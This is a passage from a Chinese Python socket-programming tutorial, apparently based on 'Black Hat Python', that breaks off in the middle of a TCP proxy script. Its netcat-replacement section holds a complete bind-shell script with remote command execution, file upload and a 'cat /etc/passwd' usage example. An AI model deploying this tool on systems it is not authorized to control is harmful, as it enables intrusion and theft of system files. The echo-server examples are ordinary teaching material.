<p>然后，我们要绑定监听的地址和端口。服务器可能有多块网卡，可以绑定到某一块网卡的IP地址上，也可以用<strong><code>0.0.0.0</code>绑定到所有的网络地址</strong>，还可以用<code>127.0.0.1</code>绑定到本机地址。<code>127.0.0.1</code>是一个特殊的IP<strong>地址</strong>，表示本机地址，如果绑定到这个地址，客户端必须同时在本机运行才能连接，也就是说，外部的计算机无法连接进来。</p>
<p>端口号需要预先指定。因为我们写的这个服务不是标准服务，所以用<code>8888</code>这个端口号。请注意，<strong>小于<code>1024</code>的端口号必须要有管理员权限才能绑定：</strong></p>
<p><code>accept()</code>会等待并返回一个客户端的连接:</p>
<p>我们需要打开两命令行窗口，一个运行服务器程序，另一个运行客户端程序，就可以看到效果了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────┐</span><br><span class="line">│Command Prompt                                    - □ x │</span><br><span class="line">├────────────────────────────────────────────────────────┤</span><br><span class="line">│$ python echo_server.py                                 │</span><br><span class="line">│Waiting <span class="keyword">for</span> connection...                               │</span><br><span class="line">│Accept new connection <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64398.</span>..           │</span><br><span class="line">│Connection <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64398</span> closed.                 │</span><br><span class="line">│                                                        │</span><br><span class="line">│       ┌────────────────────────────────────────────────┴───────┐</span><br><span class="line">│       │Command Prompt                                    - □ x │</span><br><span class="line">│       ├────────────────────────────────────────────────────────┤</span><br><span class="line">│       │$ python echo_client.py                                 │</span><br><span class="line">│       │Welcome!                                                │</span><br><span class="line">│       │Hello, Michael!                                         │</span><br><span class="line">└───────┤Hello, Tracy!                                           │</span><br><span class="line">        │Hello, Sarah!                                           │</span><br><span class="line">        │$                                                       │</span><br><span class="line">        │                                                        │</span><br><span class="line">        │                                                        │</span><br><span class="line">        └────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<p>TCP小结</p>
<p>用TCP协议进行Socket编程在Python中十分简单，对于客户端，要主动连接服务器的IP和指定端口，对于服务器，要首先监听指定端口，然后，对每一个新的连接，创建一个线程或进程来处理。通常，服务器程序会无限运行下去。</p>
<p>同一个端口，被一个Socket绑定了以后，就不能被别的Socket绑定了。</p>
<h4 id="3-UDP客户端"><a href="#3-UDP客户端" class="headerlink" title="3.UDP客户端"></a>3.UDP客户端</h4><p>TCP是建立可靠连接，并且通信双方都可以以流的形式发送数据。相对TCP，UDP则是面向无连接的协议。</p>
<p>使用UDP协议时，不需要建立连接，<strong>只需要知道对方的IP地址和端口号，就可以直接发数据包。但是，能不能到达就不知道了。</strong></p>
<p>虽然用UDP传输数据不可靠，但它的优点是和TCP比，速度快，对于不要求可靠到达的数据，就可以使用UDP协议。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(<span class="string">'bind udp on 9999'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data, addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received from %s:%s.'</span> % addr)</span><br><span class="line">    print(data.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    s.sendto(<span class="string">b'Hello, %s!'</span> % data, addr)</span><br></pre></td></tr></table></figure>

<p>创建Socket时，<strong><code>SOCK_DGRAM</code>指定了这个Socket的类型是UDP</strong>。绑定端口和TCP一样，但是<strong>不需要调用<code>listen()</code>方法</strong>，而是直接接收来自任何客户端的数据：</p>
<p><code>recvfrom()</code>方法<strong>返回数据和客户端的地址与端口</strong>，这样，服务器收到数据后，直接调用<code>sendto()</code>就可以把数据用UDP发给客户端。</p>
<p><strong>注意这里省掉了多线程</strong>，因为这个例子很简单。</p>
<p>客户端使用UDP时，首先仍然创建基于UDP的Socket，然后，<strong>不需要调用<code>connect()</code>，直接通过<code>sendto()</code>给服务器</strong>发数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line">    <span class="comment"># 接收数据:</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>从服务器接收数据仍然调用<code>recv()</code>方法。</p>
<p>仍然用两个命令行分别启动服务器和客户端测试，结果如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────┐</span><br><span class="line">│Command Prompt                                    - □ x │</span><br><span class="line">├────────────────────────────────────────────────────────┤</span><br><span class="line">│$ python udp_server.py                                  │</span><br><span class="line">│Bind UDP on <span class="number">9999.</span>..                                     │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│       ┌────────────────────────────────────────────────┴───────┐</span><br><span class="line">│       │Command Prompt                                    - □ x │</span><br><span class="line">│       ├────────────────────────────────────────────────────────┤</span><br><span class="line">│       │$ python udp_client.py                                  │</span><br><span class="line">│       │Welcome!                                                │</span><br><span class="line">│       │Hello, Michael!                                         │</span><br><span class="line">└───────┤Hello, Tracy!                                           │</span><br><span class="line">        │Hello, Sarah!                                           │</span><br><span class="line">        │$                                                       │</span><br><span class="line">        │                                                        │</span><br><span class="line">        │                                                        │</span><br><span class="line">        └────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<p><strong>UDP小结</strong></p>
<p>UDP的使用与TCP类似，但是不需要建立连接。此外，<strong>服务器绑定UDP端口和TCP端口互不冲突</strong>，也就是说，UDP的9999端口与TCP的9999端口可以各自绑定。</p>
<h4 id="4-取代netcat"><a href="#4-取代netcat" class="headerlink" title="4.取代netcat"></a>4.取代netcat</h4><p>netcat的功能如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threadin g</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一些全局变量</span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">upload = <span class="literal">False</span></span><br><span class="line">execute = <span class="string">""</span></span><br><span class="line">target = <span class="string">""</span></span><br><span class="line">upload_destination = <span class="string">""</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"BHP Net Tool"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Usage: bhpnet.py -t targt_host -p port"</span>)</span><br><span class="line">    print(<span class="string">"-l --listen          - listen on [host]:[port] for incoming connections"</span>)</span><br><span class="line">    print(<span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connetction"</span>)</span><br><span class="line">    print(<span class="string">"-c command           - initialize a command shell"</span>)</span><br><span class="line">    print(<span class="string">"-u --upload-destination  - upon receiving connection upload a file and write to [destionation]"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Examples: "</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span>)</span><br><span class="line">    print(<span class="string">"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#连接到目标主机</span></span><br><span class="line">        client.connect((target,port))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(buffer): <span class="comment">#检测是否从标准输入中接收到数据</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line"></span><br><span class="line">                data = client.recv(<span class="number">4096</span>) <span class="comment">#接收回传数据</span></span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response+= data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            print(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#等待更多的输入</span></span><br><span class="line">            buffer = input(<span class="string">""</span>) <span class="comment">#python3中没有raw_input()</span></span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[*] Exception! Exiting."</span>)</span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有定义目标，那么我们监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">        client_thread = threading.Thread(target=client_handler,</span><br><span class="line">                                         args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line"></span><br><span class="line">    command = command.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取所有的字符并写下目标</span></span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 持续读取数据直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span> % upload_destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">b"&lt;BHP:#&gt; "</span>)</span><br><span class="line"></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">                client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]): <span class="comment">#获取参数</span></span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>,<span class="string">"listen"</span>,<span class="string">"execute"</span>,<span class="string">"target"</span>,<span class="string">"port"</span>,<span class="string">"command"</span>,<span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        print(str(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>,<span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#监听还是仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment"># 这里将阻塞， 所以不再向标准输入发送数据时发送CTRL-D</span></span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听并准备上传文件、执行命令</span></span><br><span class="line">    <span class="comment"># 放置一个反弹shell</span></span><br><span class="line">    <span class="comment"># 取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h4 id="5-TCP代理"><a href="#5-TCP代理" class="headerlink" title="5.TCP代理"></a><strong>5.TCP代理</strong></h4><p>TCP代理的过程大致如下：</p>
<p>1.服务端开始监听服务端的本机端口，等待来自于代理方的socket连接；</p>
<p>2.代理方监听本机端口，等待来自客户端的socket连接；</p>
<p>3.客户端创建socket与代理方进行连接；</p>
<p>4.代理方收到来自客户端的链接后，创建一个socket与服务端进行连接；</p>
<p>5.服务端收到来自代理端的连接；</p>
<p>链接建立后，通信过程如下：</p>
<p>1.客户端发送请求给代理方；</p>
<p>2.代理方对请求进行处理，将处理后的请求发送给服务端；</p>
<p>3.服务端接收请求后，根据请求信息发送回复给代理方；</p>
<p>4.代理方将收到的回复信息进行处理，将处理后的信息发送给客户端；</p>
<p><strong>写程序过程中踩了几个坑，这里注意下，接收的数据是二进制流b’’ ，应该转化为str再进行16进制编码</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">(local_host,local_port,remote_host,remote_port,receive_first)</span>:</span></span><br><span class="line">    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host,local_port))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"failed"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"listening on %s:%d"</span> %(local_host,local_port))</span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        <span class="comment">#打印出本地连接信息</span></span><br><span class="line">        print(<span class="string">"=====&gt; Received incoming connection from %s:%d"</span>% (addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#开启一个线程与远程主机通信</span></span><br><span class="line">        proxy_thread=threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))</span><br><span class="line">        proxy_thread.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_handler</span><span class="params">(client_socket,remote_host,remote_port,receive_first)</span>:</span></span><br><span class="line">    <span class="comment">#连接远程主机</span></span><br><span class="line">    remote_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host,remote_port))</span><br><span class="line">    <span class="comment">#如果必要从远程主机接收数据</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line">        <span class="comment">#发送给我们的响应处理</span></span><br><span class="line">        remote_buffer=response_handler(remote_buffer)</span><br><span class="line">        <span class="comment">#如果我们有数据传递给本地客户端，发送它</span></span><br><span class="line">        <span class="keyword">if</span> len(remote_buffer):</span><br><span class="line">            print(<span class="string">"&lt;=== Sending %d 